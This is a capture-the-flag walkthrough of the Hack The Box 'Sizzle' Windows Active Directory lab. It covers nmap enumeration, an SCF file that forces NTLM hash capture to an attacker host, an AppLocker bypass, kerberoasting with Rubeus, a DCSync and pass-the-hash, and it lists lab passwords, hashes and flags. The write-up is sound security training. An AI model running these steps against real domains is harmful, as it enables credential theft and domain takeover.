```json
Alias: Sizzle
Date: 07-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Insane
Status: Complete
IP: 10.129.250.39
```

# Sizzle
# Summary

- Sizzle is an Insane difficulty WIndows box with an Active Directory environment. A writable directory in an SMB share allows to steal NTLM hashes which can be cracked to access the Certificate Services Portal. A self signed certificate can be created using the CA and used for PSRemoting. A SPN associated with a user allows a kerberoast attack on the box. The user is found to have Replication rights which can be abused to get Administrator hashes via DCSync.

# Used Tools

* Rubeus
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-07 15:50 PKT
Nmap scan report for 10.129.250.39
Host is up (0.24s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2024-08-07T10:52:24+00:00; 0s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2024-08-07T10:52:24+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2024-08-07T10:52:24+00:00; 0s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2024-08-07T10:52:24+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-08-07T10:52:24+00:00; 0s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-08-07T10:51:54
|_  start_date: 2024-08-07T10:47:56
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.39 seconds
```
## Discovered Subdomains
```
htb.local
sizzle.htb.local
```

---
# Enumeration

### Shares
![[Pasted image 20240808043000.png]]

### Rid Brute
```
498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: HTB\Administrator (SidTypeUser)
501: HTB\Guest (SidTypeUser)
502: HTB\krbtgt (SidTypeUser)
503: HTB\DefaultAccount (SidTypeUser)
512: HTB\Domain Admins (SidTypeGroup)
513: HTB\Domain Users (SidTypeGroup)
514: HTB\Domain Guests (SidTypeGroup)
515: HTB\Domain Computers (SidTypeGroup)
516: HTB\Domain Controllers (SidTypeGroup)
517: HTB\Cert Publishers (SidTypeAlias)
518: HTB\Schema Admins (SidTypeGroup)
519: HTB\Enterprise Admins (SidTypeGroup)
520: HTB\Group Policy Creator Owners (SidTypeGroup)
521: HTB\Read-only Domain Controllers (SidTypeGroup)
522: HTB\Cloneable Domain Controllers (SidTypeGroup)
525: HTB\Protected Users (SidTypeGroup)
526: HTB\Key Admins (SidTypeGroup)
527: HTB\Enterprise Key Admins (SidTypeGroup)
553: HTB\RAS and IAS Servers (SidTypeAlias)
571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
1001: HTB\SIZZLE$ (SidTypeUser)
1102: HTB\DnsAdmins (SidTypeAlias)
1103: HTB\DnsUpdateProxy (SidTypeGroup)
1104: HTB\amanda (SidTypeUser)
1603: HTB\mrlky (SidTypeUser)
1604: HTB\sizzler (SidTypeUser)
```

---

# Exploitation

The Public directory in 'Department Shares' is writable. We can steal user Amanda's credentials by placing an SCF file in the directory and forcing her to authenticate to our server.

Start responder
`sudo responder -I tun0`

Copy the SCF file to Users/Public
```
[Shell]
Command=2
IconFile=\\10.10.14.103\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Crack the NTLM hash.
`hashcat -m 5600 ntlm.hash rockyou.txt`

Get creds for amanda

| Username | Password   |
| -------- | ---------- |
| amanda   | Ashare1972 |
 
##  Remoting
We can see that the user amanda is in the remote management group, but we can't winrm with the plaintext credentials, It seems that we need a Certificate to remote into the machine, To generate a certificate first,

Create a Private Key
```bash
openssl genrsa -aes256 -out amanda.key 2048
```

Generate the CSR
```bash
openssl req -new -key amanda.key -out amanda.csr`
```

A portal to the CA is running on http://$IP/certsrv, submit the generated CSR there and download the returned certificate. Now we can use evil-winrm to connect to the box

```bash
evil-winrm -i $IP -u amanda -p Ashare1972 -c certnew.cer -k amanda.key
```


---
# Privilege Escalation
After logging in to the box using evil-winrm, We want to enumerate the domain but have trouble doing so because we logged in using Kerberos, When we log in using kerberos our TGT is not transferred to the target machine, We only access that machine using a TGS we requested for it. So we first request a new tgt using Rubeus.exe

Transfer Rubeus to the target machine, and try to run it. You will notice that it is being blocked by AppLocker, so to deal with that we transfer it to C:/Windows/Temp. This directory is whitelisted by AppLocker in this box. After moving it We can request a TGT.

`./Rubeus.exe asktgt /user:amanda /password:Ashare1972`

Proceed by requesting for kerberoastable accounts

`./Rubeus.exe kerberoast /outfile:Z:\temp\outspn.txt /ticket:<blob>'

Crack using hashcat

`hashcat -m 13100 outspn.txt ~/Documents/Wordlists/rockyou.txt`

Get the credentials:

| Username | Password   |
| -------- | ---------- |
| mrlky    | Football#7 |

Finally use secretsdump to DCSync

`secretsdump.py htb/mrlky@$IP`


Connect with psexec
`psexec.py administrator@$IP -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267`

---

# Flags
- b876669979e91d3162768390a4158599
- 42ee69f0febfd7b0eeaa2e8a3ddf3998

#CTF #CTF/Hackthebox #CTF/Hackthebox/Insane  #Windows #ActiveDirectory #ActiveDirectory/Kerberoasting #ActiveDirectory/ADCS #Kerberos #Kerberos/DoubleHop